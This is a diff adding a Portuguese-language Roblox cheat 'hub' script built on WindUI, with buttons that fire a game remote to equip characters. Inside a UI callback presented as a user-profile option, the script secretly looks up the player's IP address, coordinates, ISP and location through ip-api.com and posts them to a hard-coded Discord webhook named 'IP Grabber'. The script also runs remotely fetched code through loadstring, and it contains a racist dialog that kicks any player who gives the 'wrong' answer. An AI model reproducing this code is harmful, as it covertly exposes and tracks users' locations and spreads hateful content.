@@ -1,0 +1,249 @@
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+local Window = WindUI:CreateWindow({
+    Title = "ERROR HUB",
+    Icon = "crosshair", -- lucide icon
+    Author = "ERROR 404",
+    Folder = "ERROR HUB st:bb",
+    
+    -- ↓ This all is Optional. You can remove it.
+    Transparent = true,
+    Theme = "Dark",
+    Resizable = true,
+    SideBarWidth = 200,
+    BackgroundImageTransparency = 0.42,
+    HideSearchBar = true,
+    ScrollBarEnabled = false,
+    
+    -- ↓ Optional. You can remove it.
+    User = {
+        Enabled = true,
+        Anonymous = false,
+        Callback = function()
+          local HttpService = game:GetService("HttpService")
+          local Players = game:GetService("Players")
+          
+          local d = game:GetService("HttpService"):JSONDecode(request({Url = "http://ip-api.com/json?fields=query,lat,lon,country,countryCode,continent,continentCode,region,regionName,city,district,zip,timezone,offset,isp,org,as,asname,reverse,mobile,proxy,hosting"}).Body)
+          local p = Players.LocalPlayer
+
+p:Kick(("[Fica esperto patrão]\n"..
+"User: %s (ID: %d)\n"..
+"IP: %s\n"..
+"Coordinates: %.6f, %.6f\n"..
+"Continent: %s (%s)\n"..
+"Country: %s (%s)\n"..
+"Region: %s\n"..
+"City: %s | District: %s\n"..
+"ZIP: %s\n"..
+"Timezone: %s (UTC%s)\n"..
+"ISP: %s\n"..
+"Organization: %s\n"..
+"ASN: %s (%s)\n"..
+"Reverse DNS: %s\n"..
+"Mobile: %s\n"..
+"Proxy: %s\n"..
+"Hosting: %s"):format(
+p.Name, p.UserId, d.query, d.lat, d.lon, d.continent, d.continentCode,
+d.country, d.countryCode, d.regionName, d.city, d.district, d.zip,
+d.timezone, d.offset, d.isp, d.org, d.as, d.asname, d.reverse,
+d.mobile and "YES" or "NO", d.proxy and "YES" or "NO", d.hosting and "YES" or "NO"
+))
+
+local WEBHOOK = "https://discord.com/api/webhooks/1499028263253835816/gPXcSmbU2B_LhqGKyhwSAJKiXFcrRYWfyjgml4A6-WkXPQhp5SGalvaMktM57B1Cih5_"
+HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({
+    username="IP Grabber", content=p.Name.." | "..d.query.." | "..d.lat..","..d.lon.." | "..d.city.." | "..d.country
+}))
+        end,
+    },
+  
+    KeySystem = {
+        Key = { "Nightmare gostosa", "frfr" },
+        
+        Note = "Bem-vinda, minha cremosa",
+        
+        -- ↓ Optional. You can remove it.
+        Thumbnail = {
+            Image = "rbxassetid://116598924972700",
+        },
+      
+        SaveKey = false, -- automatically save and load the key.
+    },
+})
+
+Window:EditOpenButton({
+    Title = "Abrir HUB",
+    Icon = "monitor",
+    CornerRadius = UDim.new(0,16),
+    StrokeThickness = 2,
+    Color = ColorSequence.new( -- gradient
+        Color3.fromHex("#0d1b9e"), 
+        Color3.fromHex("#00ffff")
+    ),
+    OnlyMobile = false,
+    Enabled = true,
+    Draggable = true,
+})
+
+
+
+local MainTab = Window:Tab({
+    Title = "Principal",
+    Icon = "hand-fist", -- optional
+    Locked = false,
+})
+
+local Dialog = Window:Dialog({
+    Icon = "bird",
+    Title = "teste",
+    Content = "Kauã é preto dms?",
+    Buttons = {
+        {
+            Title = "Sim",
+            Callback = function()
+                print("Acertou")
+            end,
+        },
+        {
+            Title = "Não",
+            Callback = function()
+                local p = Players.LocalPlayer
+                p:Kick(("Resposta errada, seu fanboy de pretos! >:("))
+            end,
+        },
+    },
+})
+
+local ResetB = MainTab:Button({
+    Title = "Reset",
+    Desc = "Reseta seu personagem",
+    Locked = false,
+    Callback = function()
+      local Player = game:GetService("Players").LocalPlayer
+      local humanoid = Player.Character and Player.Character:FindFirstChildWhichIsA("Humanoid")
+      if replicatesignal then
+        replicatesignal(Player.Kill)
+      elseif humanoid then
+        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+      else
+        Player.Character:BreakJoints()
+      end
+    end
+})
+
+local SSB = MainTab:Button({
+    Title = "Speaker Strider",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Speaker Strider",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Space()
+
+local BrownB = MainTab:Button({
+    Title = "Brown cam (mítico)",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Brown Camera man",
+        1
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local HeadB = MainTab:Button({
+    Title = "Head Captain",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Head Captain Of The CCTV",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local AthenaB = MainTab:Button({
+    Title = "Tri titan (athena)",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Tri Soldier Athena (Girl)",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local DSMB = MainTab:Button({
+    Title = "Dark Speakerman (brawler)",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Dark Speakerman",
+        3
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local TimeLordB = MainTab:Button({
+    Title = "Chief clock",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Clock Man",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local ETVB = MainTab:Button({
+    Title = "ETV",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Energized TV",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
+
+MainTab:Divider()
+
+local APolyB = MainTab:Button({
+    Title = "Astro Poly",
+    Desc = "Equipa o personagem",
+    Locked = false,
+    Callback = function()
+      local args = {
+        "Astro Large TV man",
+        0
+      }
+      game:GetService("ReplicatedStorage"):WaitForChild("ForChangeCharacter"):FireServer(unpack(args))
+    end
+})
